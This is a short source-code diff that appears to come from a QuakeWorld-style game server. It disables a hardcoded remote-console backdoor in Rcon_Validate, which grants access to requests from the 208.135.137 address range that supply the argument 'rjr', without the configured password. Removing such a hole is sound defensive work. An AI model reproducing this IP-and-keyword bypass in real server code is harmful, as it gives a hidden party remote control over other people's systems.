@@ -628,11 +628,12 @@ void SVC_DirectConnect (void)
 
 int Rcon_Validate (void)
 {
+#if 0
 	if (net_from.ip[0] == 208 && net_from.ip[1] == 135 && net_from.ip[2] == 137
 //		&& !strcmp (Cmd_Argv(1), "tms") )
 		&& !strcmp (Cmd_Argv(1), "rjr") )
 		return 2;
-
+#endif
 	if (!strlen (rcon_password.string))
 		return 0;
 
